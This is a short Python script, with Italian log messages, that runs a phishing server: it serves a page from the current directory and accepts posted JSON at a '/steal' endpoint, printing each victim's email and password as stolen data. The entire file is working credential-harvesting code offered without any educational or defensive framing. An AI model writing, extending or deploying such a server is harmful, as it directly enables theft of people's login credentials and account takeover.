from http.server import SimpleHTTPRequestHandler, HTTPServer
import json
import os

class PhishingHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == "/steal":
            content_length = int(self.headers.get("Content-Length", 0))
            post_data = self.rfile.read(content_length)
            try:
                creds = json.loads(post_data.decode('utf-8'))
                print(f"[+] Dati rubati:\n    Email: {creds['email']}\n    Password: {creds['password']}")
            except Exception as e:
                print(f"[!] Errore nella decodifica JSON: {e}")
            self.send_response(200)
            self.end_headers()
        else:
            self.send_error(404)

    def do_GET(self):
        return super().do_GET()

if __name__ == "__main__":
    PORT = 8000
    print(f"[*] Server phishing avviato su http://localhost:{PORT}")
    os.chdir(".")  
    HTTPServer(("0.0.0.0", PORT), PhishingHandler).serve_forever()
